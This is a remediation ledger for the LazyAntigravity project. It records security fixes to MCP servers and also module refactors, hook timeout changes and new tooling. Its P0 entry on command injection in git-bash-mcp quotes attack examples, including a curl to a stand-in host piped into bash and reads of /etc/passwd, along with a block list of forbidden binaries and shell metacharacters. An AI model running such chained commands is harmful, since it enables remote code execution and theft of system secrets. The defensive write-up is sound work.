# LazyAntigravity P0 / P1 Security & Architecture Fixes Ledger

## 1. Overview
This document records all critical security (P0) and core architectural/functional (P1) remediation items executed across LazyAntigravity components, MCP servers, hooks, and orchestration pipelines.

---

## 2. P0: Critical Security & Concurrency Fixes

### 1) `git-bash-mcp` Arbitrary Command Execution (RCE) Elimination
- **Vulnerability**: The previous `git-bash-mcp` CLI checked only the first token against an allowlist and executed the entire command string through a shell, allowing chaining and RCE (e.g. `echo hi && curl evil.com | bash`, `node -e ...`, `cat /etc/passwd`, `env`).
- **Remediation**:
  - Bound child process execution strictly to `spawn(binary, args, { shell: false })`.
  - Enforced strict allowlist: only `git`, `pwd`, `ls`, and `echo` are permitted; dangerous binaries (`node`, `npm`, `npx`, `cat`, `env`, `sh`, `bash`) are completely forbidden.
  - Added strict rejection for shell metacharacters (`|`, `&`, `;`, `$`, `>`, `<`, `` ` ``, `\n`).
  - Implemented argument tokenization and safe path isolation within the project workspace.

### 2) `components/memory` CPU 100% Busy-Wait Spinlock Removal
- **Defect**: `store.ts` previously used a synchronous busy-wait loop (`while (Date.now() - start < 10) {}`), pegging CPU at 100% under concurrent contention.
- **Remediation**:
  - Replaced busy-wait with `Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms)` non-blocking sleeping lock.
  - Added automatic stale lock reclamation with timeout and exponential backoff retry.

---

## 3. P1: Core Architectural & Quality Remediation

### 1) `lsp-tools-mcp` Real Multi-Language Compiler Diagnostics & Symbol Search
- **Defect**: LSP tool returned mocked/empty stubs without real diagnostic or navigation capabilities.
- **Remediation**:
  - Implemented multilingual compiler diagnostics for TypeScript/JavaScript (`tsc`), Python (`python3 -m py_compile`), and Go (`go vet`).
  - Implemented AST declaration parser supporting TypeScript, JavaScript, Python, Go, Rust (`pub fn`, `trait`), and C/C++.
  - Added scope-aware definition ranking (local file and exported declarations prioritized) and workspace-wide symbol reference search.

### 2) `ast-grep-mcp` Real AST Pattern Matching & Safe Replacement
- **Defect**: Metavariables (`$VAR`, `$$$`) were stripped to empty strings or treated as plain substrings.
- **Remediation**:
  - Built `patternToRegex` engine converting metavariables (`$MSG`, `$ARG`, `$$$`) to structured regex tokens.
  - Implemented `ast_grep_replace` supporting dry-run previews and multi-file code rewriting.

### 3) 250 LOC Ceiling Compliance (God Module Decomposition)
- **Defect**: 6 core files in `components/ulw-loop` exceeded 250 LOC ceiling (up to 452 LOC).
- **Remediation**:
  - `checkpoint-verification.ts` (452 LOC) $\rightarrow$ decomposed into `checkpoint-reconciliation.ts`, `checkpoint-consensus-step.ts`, and core verification (all < 205 LOC).
  - `stagnation-guard.ts` (316 LOC) $\rightarrow$ extracted `stagnation-policy.ts` (< 230 LOC).
  - `verification-pipeline.ts` (313 LOC) $\rightarrow$ extracted `verification-gates.ts` (< 180 LOC).
  - `steering.ts` (270 LOC) $\rightarrow$ extracted `steering-validation.ts` (< 200 LOC).
  - `cli-commands.ts` (266 LOC) $\rightarrow$ extracted `cli-plan-commands.ts` (< 120 LOC).
  - `cli-control-plane.ts` (257 LOC) $\rightarrow$ extracted `cli-consensus-commands.ts` (< 180 LOC).

### 4) Hook Timeout Optimization & Fail-Open Protection
- **Defect**: Overly long hook timeouts (10~30s) caused UI stalls when background processes lagged.
- **Remediation**:
  - Reduced hook timeouts across `hooks.json` and `hooks/hooks.json` to 2~10s.
  - Enforced Fail-Open safety policy in `scripts/hook-runner.mjs` so hook failures never block agent execution.

### 5) Tooling & Fact Gate Additions
- Added `scripts/ultra-research.mjs` for 12-channel research decomposition and Claim Ledger 2+ domain locking.
- Added `scripts/visual-diff.mjs` with SSIM (Structural Similarity) calculation and Virtual SVG/HTML Rasterization fallback in `scripts/visual-capture.mjs`.
- Added `components/ulw-loop/src/control-plane-sqlite.ts` for Write-Ahead Logging (WAL) transactional ledger integrity.
